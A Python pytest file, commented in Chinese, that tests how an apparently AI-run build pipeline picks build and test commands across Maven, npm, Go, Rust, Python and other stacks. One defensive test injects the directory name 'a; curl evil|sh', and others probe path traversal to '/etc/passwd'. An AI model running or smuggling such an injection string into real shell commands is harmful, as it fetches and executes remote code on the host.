#!/usr/bin/env python3
"""X-H2 / X-H5 / X-H6 / X-H7 / X-H8（27 号文 §3.2 HIGH 簇）：执行期闸的多栈化。

四条同源病灶——**闸门自己对非 Maven 栈不在场**，于是要么"跳过＝通过"（假过），要么
"明知必失败仍执行"（127 → BLOCKED 空转）：

| 条 | 病灶 | 后果 |
|---|---|---|
| X-H2 | `_guess_test_cmd` 只认 `.py` | npm/go/rust 全返 None → `l1_3_test_ok=True` ＝**跳过即通过** |
| X-H5 | 跨栈误派豁免只做 Maven↔node 一个方向 | npm 工程收到 `mvn`、go 工程收到 `npm` → BLOCKED 空转 |
| X-H6 | 工具→清单表漏半个世界，未知工具一律放行 | `dotnet`/`sbt`/`make`/`composer` 空项目全 applicable → 127 |
| X-H7 | `template_for_language` 硬编 5 键而 language 是自由文本 | **Kotlin/Scala 是 JVM 栈却拿不到带 JDK 的镜像** |
| X-H8 | java 的 `file_signal` 硬编 `True` | 无栈画像时 Go/Rust/Python 每轮跑一遍 Java 修复族（**联网打 Maven Central**） |
"""
from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

_bs = Path(__file__).resolve().parent / "swarm_bootstrap.py"
_spec = importlib.util.spec_from_file_location("swarm_bootstrap", _bs)
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)

import swarm.worker.l1_pipeline as lp  # noqa: E402
from swarm.config.settings import SandboxConfig  # noqa: E402


def _tree(root: Path, files: dict[str, str]) -> Path:
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    return root


# ══════════════════════════════════════════════
# X-H6：工具→清单表 + 未知工具可观测
# ══════════════════════════════════════════════

_XH6_TOOLS = [
    ("dotnet build", "Api.csproj", "<Project/>"),
    ("dotnet build", "App.sln", "sln"),
    ("./mvnw -q compile", "pom.xml", "<project/>"),
    ("mvnw -q compile", "pom.xml", "<project/>"),
    ("sbt compile", "build.sbt", 'name := "x"'),
    ("composer install", "composer.json", "{}"),
    ("bundle exec rake", "Gemfile", 'source "x"'),
    ("mix compile", "mix.exs", "defmodule X do end"),
    ("poetry install", "pyproject.toml", "[project]"),
    ("pipenv install", "Pipfile", "[packages]"),
    ("tsc --noEmit", "tsconfig.json", "{}"),
    ("make all", "Makefile", "all:\n\techo x"),
    ("cmake --build .", "CMakeLists.txt", "project(x)"),
    ("flutter build apk", "pubspec.yaml", "name: x"),
    ("swift build", "Package.swift", "// swift-tools"),
    ("bun run build", "package.json", "{}"),
]


@pytest.mark.parametrize("cmd,rel,body", _XH6_TOOLS,
                         ids=[f"{c.split()[0]}-{r}" for c, r, _ in _XH6_TOOLS])
def test_xh6_known_tool_rejected_without_manifest_accepted_with(cmd, rel, body, tmp_path):
    """★X-H6★ 缺清单必须判**不适用**（否则明知必失败仍执行 → 127 → BLOCKED 每轮同死），
    清单在场必须判**适用**（否则是新造的假跳过——闸门整块不跑）。两个方向一起断。"""
    empty = tmp_path / "empty"
    empty.mkdir()
    assert lp._build_cmd_applicable(cmd, str(empty)) is False, (
        f"{cmd!r} 在空项目上被判适用 ⇒ 真去跑 → 127 → BLOCKED 空转")
    full = _tree(tmp_path / "full", {rel: body})
    assert lp._build_cmd_applicable(cmd, str(full)) is True, (
        f"{cmd!r} 在有 {rel} 的工程上被判不适用 ⇒ 闸门整块跳过＝假过")


@pytest.mark.parametrize("cmd", [
    "python -m pytest", "pytest -q", "python3 -m compileall -q .",
    "javac X.java", "node index.js", "bash -c 'true'",
    # 注：`go vet` **不**在此列——它确实需要 go.mod，`go` 在清单表里是对的。
])
def test_xh6_no_manifest_tools_still_pass(cmd, tmp_path):
    """『本就不需要清单』的工具不许被误杀——fail-closed 一刀切会把 python/pytest 整类关掉。"""
    assert lp._build_cmd_applicable(cmd, str(tmp_path)) is True


def test_xh6_unknown_tool_passes_but_warns(tmp_path, caplog):
    """未知工具**仍放行**（不知道它要不要清单，误杀更坏），但必须响一次——原实现连一行日志
    都没有，于是"表该补了"这件事永远没人知道（硬检查④）。"""
    import logging
    with caplog.at_level(logging.WARNING):
        assert lp._build_cmd_applicable("zigbuild --release", str(tmp_path)) is True
    assert any("_BUILD_TOOL_MANIFESTS" in r.message or "X-H6" in r.message
               for r in caplog.records), "未知工具静默放行 ⇒ 表缺项无人察觉"


def test_xh6_known_no_manifest_tool_does_not_warn(tmp_path, caplog):
    """白名单里的工具不许刷 WARNING（正常路径变噪声会让真信号被埋掉）。"""
    import logging
    with caplog.at_level(logging.WARNING):
        lp._build_cmd_applicable("pytest -q", str(tmp_path))
    assert not [r for r in caplog.records if "_BUILD_TOOL_MANIFESTS" in r.message]


# ══════════════════════════════════════════════
# X-H2：_guess_test_cmd 多栈化（治"跳过＝通过"）
# ══════════════════════════════════════════════

_XH2_CASES = [
    ("go-scoped", {"go.mod": "module x", "svc/user.go": "package svc",
                   "svc/user_test.go": "package svc"},
     ["svc/user.go"], "go test ./svc/..."),
    ("go-project", {"go.mod": "module x", "main.go": "package main"},
     ["main.go"], "go test ./..."),
    ("npm-scoped", {"package.json": '{"scripts":{"test":"vitest run"}}',
                    "src/a.ts": "x", "src/a.test.ts": "x"},
     ["src/a.ts"], "npm test --silent"),
    ("npm-__tests__", {"package.json": '{"scripts":{"test":"jest"}}',
                       "src/a.ts": "x", "src/__tests__/a.test.ts": "x"},
     ["src/a.ts"], "npm test --silent"),
    ("rust", {"Cargo.toml": "[package]", "src/lib.rs": "x"},
     ["src/lib.rs"], "cargo test --offline -q"),
    ("py-scoped", {"pyproject.toml": "[project]", "app/a.py": "x",
                   "tests/test_a.py": "x"},
     ["app/a.py"], "python -m pytest -q tests/test_a.py"),
    ("py-project", {"pyproject.toml": "[project]", "app/a.py": "x"},
     ["app/a.py"], "python -m pytest -q --maxfail=1"),
]


@pytest.mark.parametrize("name,files,mods,want", _XH2_CASES,
                         ids=[c[0] for c in _XH2_CASES])
def test_xh2_guess_test_cmd_covers_every_stack(name, files, mods, want, tmp_path):
    """★X-H2★ 原实现只认 `.py`，其余栈一律 None ⇒ L1.3 落 `test_skipped` ＝**跳过即通过**，
    测试面对 npm/go/rust 整类不存在。"""
    root = _tree(tmp_path, files)
    assert lp._guess_test_cmd(str(root), mods) == want


def test_xh2_never_invents_npm_test_without_script(tmp_path):
    """★纪律 2（绝不猜）★ 无 `scripts.test` 时 `npm test` 报 `Missing script: "test"` 退出 1
    ⇒ 会把"项目没测试"误判成"测试失败"。宁可不猜。"""
    root = _tree(tmp_path, {"package.json": '{"name":"x"}', "src/a.ts": "x"})
    assert lp._guess_test_cmd(str(root), ["src/a.ts"]) is None


def test_xh2_rejects_npm_init_placeholder_test_script(tmp_path):
    """`npm init` 的默认 test 脚本是 `echo "Error: no test specified" && exit 1`
    ——**存在但必失败**，等价于没有，必须一起排除（否则每个 npm 工程都会被判测试失败）。"""
    root = _tree(tmp_path, {
        "package.json":
            '{"scripts":{"test":"echo \\"Error: no test specified\\" && exit 1"}}',
        "src/a.ts": "x"})
    assert lp._guess_test_cmd(str(root), ["src/a.ts"]) is None


def test_xh2_jvm_deliberately_not_guessed(tmp_path):
    """★刻意不猜 JVM★ `brain/nodes/shared.py` 给 java 的 `test_command` 是**故意留空**的
    （S1："RuoYi 等项目常无测试依赖，强跑必失败"）。在 `_guess_test_cmd` 里补 `mvn test` 会
    绕过那个决定，且直接打在唯一跑过 E2E 的栈上。要改得连同 S1 一起改。"""
    root = _tree(tmp_path, {"pom.xml": "<project/>",
                            "src/main/java/A.java": "class A {}",
                            "src/test/java/ATest.java": "class ATest {}"})
    assert lp._guess_test_cmd(str(root), ["src/main/java/A.java"]) is None


def test_xh2_project_file_exists_is_path_exact(tmp_path):
    """`_project_file_exists` 与 `_manifest_present` **语义不同**，别混用（X-H2 实测踩过）：
    后者是"深度≤3 内任意位置有没有这个名字"，本地兜底只查**工程根**；scoped 测试探测要问的是
    "`svc/user_test.go` 这个具体路径在不在"。"""
    _tree(tmp_path, {"svc/user_test.go": "package svc"})
    assert lp._project_file_exists("svc/user_test.go", str(tmp_path)) is True
    assert lp._project_file_exists("user_test.go", str(tmp_path)) is False
    # ★越界一律拒★ 路径来自改动清单/构建输出（外部输入）。
    # 夹具必须让 `..` **真的逃到一个存在的文件**，否则拆掉 `..` 闸也看不出区别
    # （突变实测：`../etc/passwd` 在 tmp 下解析不到任何东西 ⇒ 两种实现都返 False ⇒ 零区分力）。
    outside = tmp_path.parent / "xh2_outside_marker.txt"
    outside.write_text("secret")
    try:
        assert lp._project_file_exists(f"../{outside.name}", str(tmp_path)) is False, \
            "`..` 逃出工程根却判存在 ⇒ 探测面越界"
        assert lp._project_file_exists("svc/../../" + outside.name, str(tmp_path)) is False
    finally:
        outside.unlink(missing_ok=True)
    assert lp._project_file_exists("/etc/passwd", str(tmp_path)) is False


# ══════════════════════════════════════════════
# X-H5：跨栈误派（治法 D 之后的剩余面）
# ══════════════════════════════════════════════

_XH5_CASES = [
    ("npm 工程被误派 mvn", {"package.json": '{"name":"a"}', "tsconfig.json": "{}",
                            "src/app.ts": "export const x=1;"},
     "mvn -q compile", ["src/app.ts"], "tsc --noEmit"),
    ("go 工程被误派 npm", {"go.mod": "module x\n\ngo 1.22\n",
                           "main.go": "package main\nfunc main(){}"},
     "npm run build", ["main.go"], "go build ./..."),
    ("rust 工程被误派 mvn", {"Cargo.toml": "[package]\nname='x'\n",
                             "src/main.rs": "fn main(){}"},
     "mvn -q compile", ["src/main.rs"], "cargo build -q"),
]


@pytest.mark.parametrize("name,files,wrong_cmd,mods,want", _XH5_CASES,
                         ids=[c[0] for c in _XH5_CASES])
def test_xh5_misdispatched_command_is_reroutable(name, files, wrong_cmd, mods, want,
                                                 tmp_path):
    """★X-H5（治法 D 已覆盖的部分）★ 误派命令必须 ①被判不适用（不去跑它）②derive 能按**真实
    清单**给出正确命令。两者齐备时 L1 的治法 D 判据就会自动改派 —— 这是本条的立论基础，
    故直接把这两个事实钉住（治法 D 的管线级断言在 test_image_builder.py）。"""
    root = _tree(tmp_path, files)
    assert lp._build_cmd_applicable(wrong_cmd, str(root)) is False, "误派命令竟被判适用"
    assert lp._derive_full_build_command(str(root), mods, None) == want


# ══════════════════════════════════════════════
# X-H7：template_for_language 归一
# ══════════════════════════════════════════════

_XH7_FAMILY = [
    ("kotlin", "java"), ("kt", "java"), ("scala", "java"), ("groovy", "java"),
    ("Spring Boot (java)", "java"), ("gradle", "java"), ("maven", "java"),
    ("typescript", "node"), ("ts", "node"), ("TypeScript + Vue", "node"),
    ("vue", "node"), ("react", "node"), ("javascript", "node"), ("nestjs", "node"),
    ("django", "python"), ("fastapi", "python"), ("py", "python"),
    ("golang", "go"), ("Gin (go)", "go"),
    ("cargo", "rust"), ("axum", "rust"),
]


@pytest.mark.parametrize("raw,fam", _XH7_FAMILY, ids=[r for r, _ in _XH7_FAMILY])
def test_xh7_free_text_language_maps_to_toolchain_family(raw, fam):
    """★X-H7★ `harness.language` 是 LLM 可写的自由文本，而模板表只有 5 个精确键。
    ★Kotlin/Scala 尤其刺眼：JVM 栈却拿不到带 JDK/Maven 的 java 镜像★ ⇒ 子任务在没有编译器的
    镜像里跑。归一判据＝"跑它需要哪套工具链"。"""
    assert SandboxConfig.canonical_template_language(raw) == fam


@pytest.mark.parametrize("raw", ["csharp", "elixir", "dart", "ruby", "php", ""])
def test_xh7_unknown_language_falls_back_honestly(raw):
    """真不认识的返空串 → 调用方回退 default（fail-honest，绝不硬塞一个族：把 csharp 塞进
    java 族会让它拿到 JDK 镜像却没有 dotnet，与 X-C2 同族的"工具不在场"）。"""
    assert SandboxConfig.canonical_template_language(raw) == ""


def test_xh7_kotlin_gets_the_same_image_as_java():
    """归一必须**真的改变模板解析结果**，不能只是有个 helper（接线覆盖 ≠ 机制存在）。"""
    c = SandboxConfig()
    assert c.template_for_language("kotlin") == c.template_for_language("java")
    assert c.template_for_language("typescript") == c.template_for_language("node")
    # 且不该是 default（那正是 X-H7 的病）
    assert c.template_for_language("kotlin") != c.default_template


# ══════════════════════════════════════════════
# X-H8：Java 修复族的 file_signal 不再恒真
# ══════════════════════════════════════════════

def test_xh8_java_repair_family_not_invoked_on_non_jvm_build(tmp_path, monkeypatch):
    """★X-H8 的**接线**断言（突变逼出来的）★ 上一条只测正则＝证实现，把
    `eligible("java", _jvm_signal)` 改回写死 `True` 它照旧绿。本条走 `_attempt_build_repair`
    本体，断言无栈画像 + 非 JVM 构建输出时 **Java 修复族一个都不被调用**——其中
    `_attempt_dependency_repair` 会联网打 Maven Central。
    """
    called: list[str] = []
    for fn in ("_attempt_import_repair", "_attempt_internal_import_drift_repair",
               "_attempt_dependency_repair", "_attempt_maven_version_repair"):
        monkeypatch.setattr(lp, fn,
                            (lambda name: lambda *a, **k: (called.append(name), (0, []))[1])(fn))
    # 其余栈的修复器一律短路，免得它们真去跑外部工具
    for fn in ("_repair_go", "_repair_ts", "_repair_rust", "_attempt_pseudospace_repair"):
        if hasattr(lp, fn):
            monkeypatch.setattr(lp, fn, lambda *a, **k: (0, []))

    go_out = "internal/handler/user.go:7:2: no required module provides package x\n"
    lp._attempt_build_repair(str(tmp_path), go_out, ["main.go"], 30, None)
    assert called == [], f"无栈画像 + Go 构建输出，仍唤起了 Java 修复族: {called}"

    # 反向臂：真 JVM 输出必须唤起（否则是把闸拧成恒关＝Java 修复整族失效）
    called.clear()
    jvm_out = "[ERROR] /p/src/main/java/com/acme/A.java:[7,25] package x does not exist\n"
    lp._attempt_build_repair(str(tmp_path), jvm_out, ["A.java"], 30, None)
    assert called, "JVM 构建输出却没唤起 Java 修复族 ⇒ 闸被拧成恒关"


def test_xh8_jvm_repair_signal_requires_real_evidence():
    """★X-H8★ 原实现 `eligible("java", True)` 写死常量 ⇒ 无栈画像时 Go/Rust/Python 工程**每轮**
    跑一遍 Java 修复族，其中 `_attempt_dependency_repair` 会**联网打 Maven Central 全文检索**
    ⇒ 白付网络往返与超时预算，而无栈画像恰恰是最该省的时候。
    判据换成"构建输出里真出现 JVM 源文件"——既保住原意（modified 没列出也认），又不再恒真。"""
    assert lp._JVM_SRC_IN_TEXT_RE.search(
        "[ERROR] /p/src/main/java/com/acme/A.java:[7,25] package x does not exist")
    assert lp._JVM_SRC_IN_TEXT_RE.search("Foo.kt:12:5: error: unresolved reference")
    assert lp._JVM_SRC_IN_TEXT_RE.search("bar/Baz.scala:3: error")
    # 非 JVM 的构建输出不许命中（命中即 Java 修复族又被无条件唤起）
    for txt in ("internal/handler/user.go:7:2: no required module provides package x",
                "src/app.ts(3,24): error TS2307: Cannot find module './x'",
                "error[E0432]: unresolved import `crate::svc`",
                "ModuleNotFoundError: No module named 'app.services.user'"):
        assert not lp._JVM_SRC_IN_TEXT_RE.search(txt), f"非 JVM 输出命中了 JVM 判据: {txt[:40]}"


# ══════════════════════════════════════════════
# X-H1 + N-4 + N-2：_derive_full_build_command 多栈化 + 跨栈污染
# ══════════════════════════════════════════════

_XH1_CASES = [
    # X-H1：npm 改 .js/.jsx/.vue —— 原先只认 .ts/.tsx+tsconfig ⇒ 这些形态零构建闸
    ("npm-js", {"package.json": '{"scripts":{"build":"vite build"}}', "src/a.js": "x"},
     ["src/a.js"], "npm run build --if-present"),
    ("npm-vue", {"package.json": '{"scripts":{"build":"vite build"}}', "src/A.vue": "x"},
     ["src/A.vue"], "npm run build --if-present"),
    ("npm-jsx", {"package.json": '{"scripts":{"build":"webpack"}}', "src/a.jsx": "x"},
     ["src/a.jsx"], "npm run build --if-present"),
    # tsconfig 在场时仍优先 tsc（最强的确定性类型闸）
    ("ts-prefers-tsc", {"tsconfig.json": "{}", "package.json": '{"scripts":{"build":"x"}}',
                        "src/a.ts": "x"}, ["src/a.ts"], "tsc --noEmit"),
    # N-4：python 原先**没有任何分支**
    ("py-pyproject", {"pyproject.toml": "[project]", "app/a.py": "x"},
     ["app/a.py"], "python3 -m compileall -q ."),
    ("py-requirements", {"requirements.txt": "flask", "app/a.py": "x"},
     ["app/a.py"], "python3 -m compileall -q ."),
    ("py-setuppy", {"setup.py": "from setuptools import setup", "app/a.py": "x"},
     ["app/a.py"], "python3 -m compileall -q ."),
    # N-2：go.work 多模块仓
    ("go-work", {"go.work": "use ./a\n", "a/go.mod": "module a", "a/m.go": "package a"},
     ["a/m.go"], "go build ./..."),
    # X-H1：其余栈
    ("csharp-root", {"Api.csproj": "<Project/>", "A.cs": "class A{}"},
     ["A.cs"], "dotnet build --nologo -v q"),
    ("elixir", {"mix.exs": "defmodule X do end", "lib/a.ex": "x"},
     ["lib/a.ex"], "mix compile --warnings-as-errors"),
    ("dart", {"pubspec.yaml": "name: x", "lib/a.dart": "x"},
     ["lib/a.dart"], "dart analyze"),
    # 回归臂：JVM 基线逐字节不变
    ("regress-maven", {"pom.xml": "<project/>", "src/main/java/A.java": "class A{}"},
     ["src/main/java/A.java"], "mvn -q compile"),
    ("regress-gradle", {"build.gradle": "plugins{id 'java'}", "gradlew": "#!/bin/sh",
                        "src/main/java/A.java": "class A{}"},
     ["src/main/java/A.java"], "./gradlew -q classes"),
    ("regress-rust", {"Cargo.toml": "[package]", "src/main.rs": "fn main(){}"},
     ["src/main.rs"], "cargo build -q"),
]


@pytest.mark.parametrize("name,files,mods,want", _XH1_CASES, ids=[c[0] for c in _XH1_CASES])
def test_xh1_derive_covers_every_stack(name, files, mods, want, tmp_path):
    """★X-H1 + N-4 + N-2★ `_derive_full_build_command` 原是 ext×manifest×build 的 if 链：
    npm 改 `.js/.vue`、python（**整个栈没有分支**）、C#/PHP/Ruby/Elixir/Dart、go.work 多模块
    → 全部返 `''` ＝**零构建闸**（改坏了也没人拦）。回归臂钉住 JVM/rust 逐字节不变。"""
    root = _tree(tmp_path, files)
    assert lp._derive_full_build_command(str(root), mods, None) == want


def test_xh1_never_invents_npm_build_without_script(tmp_path):
    """★纪律 2★ 无 `scripts.build` 时不下发 `npm run build`。虽然 `--if-present` 会让它退出 0，
    但那等于"闸门静默不跑"＝假过；返 `''` 才是诚实的"派生不出"。"""
    root = _tree(tmp_path, {"package.json": '{"name":"x"}', "src/a.js": "x"})
    assert lp._derive_full_build_command(str(root), ["src/a.js"], None) == ""


_POLLUTION = [
    ("maven+tools/go.mod", {"pom.xml": "<project/>", "tools/go.mod": "module t",
                            "tools/m.go": "package t"},
     ["tools/m.go"], "cd tools && go build ./..."),
    ("csharp 在子目录", {"src/Api.csproj": "<Project/>", "src/A.cs": "class A{}"},
     ["src/A.cs"], "cd src && dotnet build --nologo -v q"),
]


@pytest.mark.parametrize("name,files,mods,want", _POLLUTION, ids=[c[0] for c in _POLLUTION])
def test_xh1_cross_stack_pollution_anchors_to_manifest_dir(name, files, mods, want, tmp_path):
    """★X-H1 跨栈污染★ 实测形态：Maven 单体里有个 `tools/go.mod`，子任务只改 `.go` ⇒ 旧实现在
    **工程根**下发 `go build ./...` ⇒ 根没有 go.mod，命令必失败 → 127 → BLOCKED。
    治法：命令锚到**清单所在目录**（`cd tools && …`），而不是假定清单在根。"""
    root = _tree(tmp_path, files)
    assert lp._derive_full_build_command(str(root), mods, None) == want


def test_xh1_unsafe_manifest_dir_is_refused(tmp_path, monkeypatch, caplog):
    """目录名来自工程树（外部输入）⇒ 形态不安全就不拼进 shell 命令（S-5 同源判据）。"""
    import logging
    monkeypatch.setattr(lp, "_manifest_dir", lambda names, pp: "a; curl evil|sh")
    root = _tree(tmp_path, {"go.mod": "module x", "m.go": "package main"})
    with caplog.at_level(logging.WARNING):
        got = lp._derive_full_build_command(str(root), ["m.go"], None)
    assert got == "", "不安全目录名被拼进了命令"
    assert any("形态不安全" in r.message for r in caplog.records)


def test_xh1_manifest_present_local_matches_sandbox_semantics(tmp_path):
    """★本地兜底必须与沙箱分支同口径（X-H1 实测发现两者不一致）★
    沙箱是 `find -maxdepth 3 \\( -name a -o -name b \\)`：递归到深度 3 且 `-name` 支持 glob。
    原本地实现只看工程根、且把 `*.csproj` 当字面名 ⇒ 子目录清单与整个 C# 栈在本地判 False，
    而沙箱判 True ⇒ **测试在本地绿而生产另一套行为**（本战役反复吃的形态）。"""
    _tree(tmp_path, {"tools/go.mod": "module t", "src/Api.csproj": "<Project/>",
                     "deep/a/b/far.mod": "x"})
    assert lp._manifest_present(("go.mod",), str(tmp_path)) is True, "子目录清单漏判"
    assert lp._manifest_present(("*.csproj",), str(tmp_path)) is True, "glob 不生效"
    assert lp._manifest_present(("nope.toml",), str(tmp_path)) is False
